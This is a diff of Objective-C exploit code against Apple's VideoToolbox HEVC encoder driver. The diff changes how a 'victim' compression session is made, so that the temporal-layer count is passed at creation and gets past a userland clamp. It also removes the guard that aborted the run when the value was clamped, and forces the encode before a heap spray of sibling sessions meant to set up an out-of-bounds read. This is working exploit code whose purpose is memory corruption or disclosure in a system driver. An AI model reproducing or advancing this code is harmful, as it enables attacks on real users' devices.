@@ -116,35 +116,36 @@
         [report appendFormat:@"  cand[%d] = 0x%016llx\n", c, x0cands[c]];
     }
 
-    // 1) VICTIM session first — its pInfo is allocated BEFORE the spray,
-    //    so spray siblings land after it in the zone (forward OOB reads them).
-    VTCompressionSessionRef victim = [self makeSessionWidth:W height:H];
-    if (!victim) {
+    // 1) VICTIM session first (analyst recipe: NTL rides in encoderSpecification
+    //    at Create and the unclamp COMMITS at Prepare - PRE readback shows 1,
+    //    POST shows the real value). Encode is forced regardless of readback.
+    NSDictionary *vspec = @{
+        @"EncoderUsage": @1,
+        @"NumberOfTemporalLayers": @(self.ntl),
+        @"AllowTemporalCompression": @YES,
+    };
+    VTCompressionSessionRef victim = NULL;
+    OSStatus vst = VTCompressionSessionCreate(kCFAllocatorDefault, W, H,
+                                              kCMVideoCodecType_HEVC,
+                                              (__bridge CFDictionaryRef)vspec, NULL, NULL,
+                                              NULL, NULL, &victim);
+    if (vst != noErr || !victim) {
         [report appendString:@"\nVERDICT: VICTIM_SESSION_FAILED\n"];
         return report;
     }
     int ntl = self.ntl;
-    VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
-    int usage = 1;
-    VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@(usage));
-    // Analyst: the setter returns 0 but silently clamps to 1 in the userland VT
-    // wrapper — an encode with clamped NTL cannot trigger the OOB at all.
+    VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
+    OSStatus vprep = VTCompressionSessionPrepareToEncodeFrames(victim);
     int vrb = -1;
     CFNumberRef vbn = NULL;
     if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &vbn) == noErr && vbn) {
         CFNumberGetValue(vbn, kCFNumberIntType, &vrb);
         CFRelease(vbn);
     }
-    [self journal:[NSString stringWithFormat:@"VICTIM_READY ntl=%d readback=%d", ntl, vrb]];
-    if (vrb != ntl) {
-        [report appendFormat:@"victim NTL readback=%d (want %d)\n", vrb, ntl];
-        [report appendString:@"\nVERDICT: VICTIM_NTL_CLAMPED\n"];
-        [report appendString:@"NTL clamped in the userland VideoToolbox wrapper — no OOB possible.\n"];
-        [report appendString:@"Spray and encode skipped; fix the clamp (creation-spec probe) first.\n"];
-        VTCompressionSessionInvalidate(victim);
-        CFRelease(victim);
-        return report;
-    }
+    [self journal:[NSString stringWithFormat:@"VICTIM_READY ntl=%d prepare=%d readback_POST=%d",
+                   ntl, (int)vprep, vrb]];
+    [report appendFormat:@"victim NTL POST-prepare readback=%d (want %d) — encode forced regardless\n",
+     vrb, ntl];
 
     // 2) SPRAY siblings — same driver, same pInfo allocation class.
     //    Each sibling carries the marker in several int-valued properties so
